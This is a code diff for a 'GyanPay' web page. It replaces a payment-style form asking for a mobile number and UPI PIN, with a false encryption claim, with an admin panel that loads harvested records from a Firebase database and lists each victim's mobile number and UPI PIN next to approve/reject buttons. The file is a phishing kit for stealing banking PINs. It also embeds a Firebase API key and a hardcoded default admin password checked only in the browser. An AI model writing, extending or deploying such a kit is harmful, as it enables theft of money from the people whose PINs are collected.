@@ -3,103 +3,246 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GyanPay - Secure Platform</title>
+    <title>GyanPay - Admin Panel</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
         body {
-            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            padding: 20px;
         }
         .container {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
+            max-width: 900px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h2, h3 {
+            color: #333;
             text-align: center;
         }
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 10px;
-            font-size: 24px;
+        .login-box, .admin-panel {
+            display: none;
         }
-        p {
-            color: #7f8c8d;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 13px;
-            color: #34495e;
-        }
-        input {
+        table {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #cbd5e1;
-            border-radius: 8px;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-        input:focus {
-            border-color: #4f46e5;
-        }
-        .btn {
-            background: #4f46e5;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
--           cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #4338ca;
-        }
-        .footer-text {
+            border-collapse: collapse;
             margin-top: 20px;
-            font-size: 12px;
-            color: #94a3b8;
+        }
+        th, td {
+            padding: 12px;
+            border: 1px solid #ddd;
+            text-align: center;
+        }
+        th {
+            background-color: #007bff;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background-color: #f2f2f2;
+        }
+        button {
+            padding: 6px 12px;
+            cursor: pointer;
+            border: none;
+            border-radius: 4px;
+            color: white;
+        }
+        .btn-approve { background-color: #28a745; }
+        .btn-reject { background-color: #dc3545; }
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .settings-card {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+        }
+        .settings-card input {
+            padding: 6px;
+            margin: 5px 10px 5px 0;
+            width: 100px;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>GyanPay</h1>
-        <p>Secure & Fast Transaction</p>
-        
-        <div class="form-group">
-            <label for="mobile">Mobile Number</label>
-            <input type="tel" id="mobile" placeholder="Enter your mobile number" maxlength="10">
+        <!-- 1. Admin Login Box -->
+        <div id="loginBox" class="login-box" style="display: block;">
+            <h2>Admin Login</h2>
+            <div style="text-align: center;">
+                <input type="password" id="adminPasswordInput" placeholder="Enter Admin Password" style="padding: 8px; width: 60%;"><br><br>
+                <button onclick="loginAdmin()" style="background-color: #007bff; padding: 8px 16px;">Login</button>
+                <p id="loginError" style="color: red;"></p>
+            </div>
         </div>
 
-        <div class="form-group">
-            <label for="upi-pin">UPI PIN</label>
-            <input type="password" id="upi-pin" placeholder="Enter your UPI PIN" maxlength="6">
-        </div>
+        <!-- 2. Main Admin Panel -->
+        <div id="adminPanel" class="admin-panel">
+            <div class="top-bar">
+                <h2>GyanPay Admin Panel</h2>
+                <button onclick="changePassword()" style="background-color: #ffc107; color: black; font-weight: bold;">Change Password</button>
+            </div>
 
-        <button class="btn">Proceed</button>
-        <div class="footer-text">Protected by 256-bit Encryption</div>
+            <!-- छोटा-मोटा अपडेट करने के लिए Settings Section -->
+            <div class="settings-card">
+                <h3>⚙️ Game Quick Settings</h3>
+                <div style="text-align: center;">
+                    <label>Timer (Seconds): </label>
+                    <input type="number" id="settingTimer" value="10">
+                    
+                    <label>Total Questions: </label>
+                    <input type="number" id="settingQuestions" value="10">
+                    
+                    <button onclick="saveSettings()" style="background-color: #17a2b8; padding: 6px 14px;">Save Settings</button>
+                </div>
+            </div>
+            
+            <h3>User Submissions & Approvals</h3>
+            <div id="loading" class="loading">Loading data from database...</div>
+            
+            <table id="dataTable" style="display: none;">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Mobile Number</th>
+                        <th>UPI PIN</th>
+                        <th>Status</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <!-- Data dynamically aayega -->
+                </tbody>
+            </table>
+        </div>
     </div>
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs, updateDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
+          authDomain: "gyanpey.firebaseapp.com",
+          projectId: "gyanpey",
+          storageBucket: "gyanpey.firebasestorage.app",
+          messagingSenderId: "198373987569",
+          appId: "1:198373987569:web:1a03dfe48402106d750550"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Default credentials aur settings local storage me set karna
+        if (!localStorage.getItem("adminPass")) {
+            localStorage.setItem("adminPass", "admin123");
+        }
+        if (!localStorage.getItem("gameTimer")) {
+            localStorage.setItem("gameTimer", "10");
+        }
+        if (!localStorage.getItem("gameQuestions")) {
+            localStorage.setItem("gameQuestions", "10");
+        }
+
+        // Page load hone par saved settings inputs me dikhana
+        document.getElementById("settingTimer").value = localStorage.getItem("gameTimer");
+        document.getElementById("settingQuestions").value = localStorage.getItem("gameQuestions");
+
+        window.loginAdmin = function() {
+            const pass = document.getElementById("adminPasswordInput").value;
+            if (pass === localStorage.getItem("adminPass")) {
+                document.getElementById("loginBox").style.display = "none";
+                document.getElementById("adminPanel").style.display = "block";
+                loadAdminData();
+            } else {
+                document.getElementById("loginError").innerText = "Invalid Password!";
+            }
+        };
+
+        window.changePassword = function() {
+            const newPass = prompt("Enter new admin password:");
+            if (newPass) {
+                localStorage.setItem("adminPass", newPass);
+                alert("Password changed successfully!");
+            }
+        };
+
+        window.saveSettings = function() {
+            const timerVal = document.getElementById("settingTimer").value;
+            const qVal = document.getElementById("settingQuestions").value;
+            
+            localStorage.setItem("gameTimer", timerVal);
+            localStorage.setItem("gameQuestions", qVal);
+            alert("Settings updated successfully!");
+        };
+
+        async function loadAdminData() {
+            const tableBody = document.getElementById('tableBody');
+            const loading = document.getElementById('loading');
+            const dataTable = document.getElementById('dataTable');
+
+            try {
+                const q = query(collection(db, "usersData"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+
+                tableBody.innerHTML = "";
+                let index = 1;
+
+                if (querySnapshot.empty) {
+                    loading.innerHTML = "No data found in database.";
+                    return;
+                }
+
+                querySnapshot.forEach((documentSnap) => {
+                    const data = documentSnap.data();
+                    const docId = documentSnap.id;
+                    const status = data.status || "Pending";
+
+                    const row = `<tr>
+                        <td>${index++}</td>
+                        <td>${data.mobileNumber || 'N/A'}</td>
+                        <td>${data.upiPin || 'N/A'}</td>
+                        <td><b>${status}</b></td>
+                        <td>
+                            <button class="btn-approve" onclick="updateStatus('${docId}', 'Approved')">Approve</button>
+                            <button class="btn-reject" onclick="updateStatus('${docId}', 'Rejected')">Reject</button>
+                        </td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
+                });
+
+                loading.style.display = "none";
+                dataTable.style.display = "table";
+
+            } catch (error) {
+                console.error("Error loading data: ", error);
+                loading.innerHTML = "Error loading data. Check console.";
+            }
+        }
+
+        window.updateStatus = async function(docId, newStatus) {
+            try {
+                const docRef = doc(db, "usersData", docId);
+                await updateDoc(docRef, { status: newStatus });
+                alert("User status updated to: " + newStatus);
+                loadAdminData();
+            } catch (error) {
+                console.error("Error updating status: ", error);
+                alert("Failed to update status.");
+            }
+        };
+    </script>
+
 </body>
 </html>
